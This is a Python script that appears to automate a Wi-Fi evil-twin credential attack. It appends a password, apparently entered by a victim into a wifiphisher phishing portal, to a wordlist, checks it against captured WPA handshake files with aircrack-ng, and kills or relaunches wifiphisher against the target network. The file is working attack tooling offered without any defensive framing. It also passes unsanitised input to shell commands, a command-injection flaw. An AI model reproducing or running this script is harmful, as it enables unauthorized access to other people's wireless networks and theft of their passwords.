import os.path
import subprocess
##aircrack-ng -w ./handshakes/password ./handshakes/NetComm-01.cap | grep "KEY FOUND" && echo "found"
import sys
import time
from __main__ import *
from constants import *

def capchecking1(password, bssid, essid, channel):
    ##password="20172017"
    ##essid="NetComm"
    passfile="./handshakes/password"
    wppath="sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/bin/wifiphisher -nJ"
    subprocess.call("echo \""+password+"\" >> "+passfile, shell=True)
    a=1
    while a<100 :
        b=str(a).zfill(2)
        capfile='./handshakes/'+essid+'-'+b+'.cap'
        print(capfile)
        if os.path.exists(capfile) :
            capcheck=subprocess.getoutput("aircrack-ng -w "+passfile+" "+capfile+" | grep \"KEY FOUND\" && echo \"found\"")
            if "found" in capcheck:
                ##kill wifiphisher
                print("found")
                subprocess.call("killall wifiphisher",shell=True)
                break
            else:
                ##kill wifiphisher
                ##restart wifiphisher
                ##kill aireplay-ng
                print("not found")
                print("checknewcap")
                a+=1
        else :
            print("need more capfiles")
            subprocess.call("killall wifiphisher",shell=True)
            subprocess.call("killall cpulimit",shell=True)
            ##subprocess.call("killall aireplay-ng",shell=True)
            subprocess.call("sudo gnome-terminal -e \""+wppath+" --essid "+essid+"\"",shell=True)

